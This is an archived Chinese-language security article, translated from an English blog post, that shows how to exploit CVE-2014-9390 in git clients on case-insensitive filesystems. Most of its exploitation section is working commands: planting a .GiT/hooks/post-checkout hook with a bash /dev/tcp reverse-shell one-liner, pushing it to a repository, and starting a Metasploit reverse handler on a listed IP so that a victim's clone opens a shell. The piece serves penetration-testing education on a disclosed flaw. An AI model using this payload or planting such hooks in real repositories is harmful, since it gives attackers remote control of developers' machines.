<html>
<head>
     <title>One git command may cause you hacked(CVE-2014-9390) - 夺吻狂魔</title>
	 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
</head>
<body>
<h1>URL:<a href="http://drops.wooyun.org/papers/4386">http://drops.wooyun.org/papers/4386</a></h1>

      <p>
        <p>from：https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/</p>

<h2>0x00 背景</h2>

<hr />

<p>CVE-2014-9390是最近很火的一个漏洞，一个git命令就可能导致你被黑，我不打算深入探讨这个漏洞的细节，官方已经在<a href="https://github.com/blog/1938-git-client-vulnerability-announced">https://github.com/blog/1938-git-client-vulnerability-announced</a> 和 <a href="http://article.gmane.org/gmane.linux.kernel/1853266">http://article.gmane.org/gmane.linux.kernel/1853266</a>发布了详细信息。总之，如果你使用了大小写不敏感的操作系统例如Windows或OSX，你应该更新git客户端了。</p>

<p>让我们以渗透测试的角度来看看这个漏洞。</p>

<h2>0x01 准备</h2>

<hr />

<p>我创建了一个命名为CVE-2014-9390的新项目。</p>

<!--more-->

<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/15dcbf320d6449b2521405335a705a63.jpg" alt="enter image description here" /></p>

<p>建立一个.GiT（大些G，小写i然后大写T）目录，创建一个vulnerable.txt文件，然后push到项目中。</p>

<pre><code>#!bash
root@rootlab:~/cve-2014-9390# mkdir .GiT
root@rootlab:~/cve-2014-9390# cd .GiT/
root@rootlab:~/cve-2014-9390/.GiT# echo "Vulnerable" &gt;&gt; vulnerable.txt
root@rootlab:~/cve-2014-9390/.GiT# cd ..
root@rootlab:~/cve-2014-9390# git add .
root@rootlab:~/cve-2014-9390# git commit -m 'poc'
[master bec157d] poc
1 file changed, 1 insertion(+)
create mode 100644 .GiT/vulnerable.txt
root@rootlab:~/cve-2014-9390# git push
</code></pre>

<p>我们再从Windows的电脑上用存在漏洞的git客户端pull同一个项目看看</p>

<pre><code>#!bash
rootlab@MINCE ~
$ git clone <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5f38362b1f38362b333e3d713c3032">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("data-cfhash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}t.parentNode.removeChild(t);}}catch(u){}}()/* ]]> */</script>:mehmet/cve-2014-9390.git
Cloning into 'cve-2014-9390'...
Enter passphrase for key '/c/Users/rootlab/.ssh/id_rsa':
remote: Counting objects: 7, done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 7 (delta 0), reused 0 (delta 0)R
Receiving objects: 100% (7/7), done.
Checking connectivity... done.
</code></pre>

<p>给大家看一下.git目录，本应该在.GiT目录的vulnerable.txt也在这里</p>

<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/cc7183b1367d446953fde5904149701d.jpg" alt="enter image description here" /></p>

<h2>0x02 利用</h2>

<hr />

<h3>什么是git的hooks</h3>

<p>与许多其他版本控制系统类似，一些重要的动作发生时，git有一个方法来执行自定义的脚本。hooks分两方面：客户端和服务器端。当进行commit和merge时可以触发客户端的hooks。</p>

<p>当执行git命令如git pull和git checkout时就可以执行客户端的脚本。</p>

<h3>如何实现git hooks？</h3>

<p>重写.git/hooks目录下的一个脚本文件，然后执行他，我们可以通过这个漏洞来实现。</p>

<p>我们创建一个假的git目录然后建立一个叫post-checkout的文件。</p>

<pre><code>#!bash
root@rootlab:~/cve-2014-9390# mkdir .GiT/hooks
root@rootlab:~/cve-2014-9390# echo '#!/bin/sh' &gt; .GiT/hooks/post-checkout
root@rootlab:~/cve-2014-9390# echo 'bash -i &gt;&amp; /dev/tcp/[IPADDRESS]/443 0&gt;&amp;1' &gt;&gt; .GiT/hooks/post-checkout
root@rootlab:~/cve-2014-9390# git add .
root@rootlab:~/cve-2014-9390# git commit -m 'add reverse connection payload'
[master 389c979] add powershell payload
1 file changed, 4 insertions(+)
create mode 100644 .GiT/hooks/post-checkout
root@rootlab:~//cve-2014-9390# git push
</code></pre>

<p>我们在服务器端监听</p>

<pre><code>#!bash
msf &gt; use exploit/multi/handler
msf exploit(handler) &gt; set PAYLOAD generic/shell_reverse_tcp
msf exploit(handler) &gt; set LPORT 443
msf exploit(handler) &gt; set LHOST 108.61.164.142
msf exploit(handler) &gt; exploit
[*] Started reverse handler on 108.61.164.142:443
[*] Starting the payload handler...
</code></pre>

<p>我们clone https://gitlab.com/mehmet/cve-2014-9390</p>

<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/7e816e35f0d1dd16e4b4dab70ea3d411.jpg" alt="enter image description here" /></p>

<p>看起来都是很正常，但是……</p>

<p><img src="https://github.com/ikey4u/WooyunImages/raw/master/pics/31e03576d90f9ba3eafc132b96667ade.jpg" alt="enter image description here" /></p>      </p>
    
</body>
</html>